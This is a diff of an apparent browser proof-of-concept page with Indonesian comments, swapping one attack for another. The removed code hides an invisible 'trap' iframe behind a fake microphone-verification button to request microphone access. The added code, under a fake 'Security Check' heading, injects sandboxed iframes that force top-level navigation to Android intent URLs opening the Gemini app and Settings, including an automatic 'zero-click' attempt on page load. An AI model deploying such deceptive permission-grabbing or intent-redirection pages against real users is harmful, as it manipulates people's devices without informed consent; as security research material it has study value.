@@ -15,7 +15,7 @@
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%; position: relative;
+    max-width: 400px; width: 100%;
   }
   h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; margin-bottom: 20px; font-size: 14px; }
@@ -23,38 +23,23 @@
     background: #007aff; color: #fff; padding: 15px;
     border-radius: 8px; font-size: 16px; font-weight: bold;
     cursor: pointer; border: none; width: 100%;
-    position: relative; z-index: 10;
   }
   button:hover { background: #005bb5; }
-  
-  /* Iframe Tersembunyi untuk Memicu Mikrofon */
-  #voiceFrame {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0;
-    z-index: 5;
-    border: none;
-    pointer-events: none; /* Biarkan klik menembus ke tombol asli */
-  }
-
   #log {
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
     border-radius: 6px; width: 100%; max-width: 400px;
-    height: 120px; overflow-y: auto; text-align: left;
+    height: 100px; overflow-y: auto; text-align: left;
   }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🎤 Voice Recognition Check</h1>
-  <p>Klik tombol di bawah untuk memverifikasi mikrofon Anda.</p>
-  <button id="startBtn">Verify Microphone</button>
-
-  <!-- IFRAME PENJEBAK -->
-  <iframe id="voiceFrame" allow="microphone; camera"></iframe>
+  <h1>🔒 Security Check</h1>
+  <p>Klik tombol di bawah untuk memverifikasi integrasi AI.</p>
+  <button id="intentBtn">Open Gemini</button>
 </div>
 
 <div id="log">Sistem siap...</div>
@@ -64,72 +49,79 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var voiceFrame = document.getElementById('voiceFrame');
-  
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
     console.log(msg);
   }
 
   // ============================================
-  // 1. PAYLOAD IFRAME (MEMINTA MIKROFON)
+  // 1. TARGET INTENT (GEMINI & SETTINGS)
   // ============================================
-  var iframePayload = `
-    <!DOCTYPE html>
-    <html>
-    <body style="background:transparent;margin:0;">
-      <script>
-        // Minta Izin Mikrofon (seolah-olah untuk Voice Recognition)
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(function(stream) {
-              parent.postMessage({ status: 'MIC_GRANTED' }, '*');
-              // Hentikan stream setelah diizinkan
-              stream.getTracks().forEach(function(t) { t.stop(); });
-            })
-            .catch(function(err) {
-              parent.postMessage({ status: 'MIC_DENIED', error: err.name }, '*');
-            });
-        }
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  voiceFrame.srcdoc = iframePayload;
+  // Gemini Package: com.google.android.apps.bard
+  // Settings Action: android.settings.SETTINGS
+  
+  var intentGemini = "intent://launch/#Intent;scheme=googleapp;package=com.google.android.apps.bard;end";
+  var intentSettings = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
 
   // ============================================
-  // 2. LISTENER (MENDETEKSI KEBOCORAN)
+  // 2. FUNGSI INJECT IFRAME INTENT
   // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data && e.data.status === 'MIC_GRANTED') {
-      log("🚨 BUG: IZIN MIKROFON DIBERIKAN DARI IFRAME!");
-    } else if (e.data && e.data.status === 'MIC_DENIED') {
-      log("✅ Mikrofon diblokir: " + e.data.error);
-    }
-  });
-
-  // ============================================
-  // 3. TRIGGER EVENT (Saat Tombol Diklik)
-  // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    log("[!] Meminta izin mikrofon via Iframe...");
-    
-    // Paksa iframe untuk meminta izin (jika belum)
+  function injectIntentIframe(targetIntent) {
     try {
-      // Mengirim pesan ke iframe (meskipun script iframe sudah jalan otomatis)
-      voiceFrame.contentWindow.postMessage('REQ_MIC', '*');
-    } catch(e) {}
+      var iframe = document.createElement("iframe");
+      
+      // Atribut Sandbox yang meminta izin navigasi top-level
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
+      
+      // Payload HTML di dalam iframe
+      iframe.srcdoc = `
+        <!DOCTYPE html>
+        <html>
+        <body style="margin:0;">
+          <script>
+            // Eksekusi Intent dari dalam iframe
+            try {
+              window.top.location.href = "${targetIntent}";
+            } catch(e) {
+              try { window.location.href = "${targetIntent}"; } catch(e2) {}
+            }
+          <\/script>
+        </body>
+        </html>
+      `;
+      
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+      
+      log("[+] Iframe Intent injected: " + targetIntent.split(';')[0]);
+    } catch(e) {
+      log("[-] Gagal inject iframe: " + e.message);
+    }
+  }
+
+  // ============================================
+  // 3. EKSEKUSI SAAT TOMBOL DIKLIK
+  // ============================================
+  document.getElementById('intentBtn').addEventListener('click', function() {
+    log("[!] Memicu Intent Redirection via Iframe...");
+    
+    // Coba buka Gemini
+    injectIntentIframe(intentGemini);
+    
+    // Fallback: Coba buka Settings setelah 1 detik
+    setTimeout(function() {
+      log("[Fallback] Mencoba membuka Settings...");
+      injectIntentIframe(intentSettings);
+    }, 1000);
   });
 
   // ============================================
-  // 4. ZERO-CLICK ATTEMPT (Saat Load)
+  // 4. ZERO-CLICK ATTEMPT (Otomatis saat Load)
   // ============================================
   setTimeout(function() {
-    log("[Zero-Click] Mencoba meminta izin mikrofon secara otomatis...");
-    // Prompt asli mungkin diblokir karena tidak ada gesture.
-    // Tapi ini menguji apakah prompt muncul dengan origin yang salah.
-  }, 1000);
+    log("[Zero-Click] Mencoba inject iframe otomatis...");
+    injectIntentIframe(intentGemini);
+  }, 2000);
 
 })();
 </script>
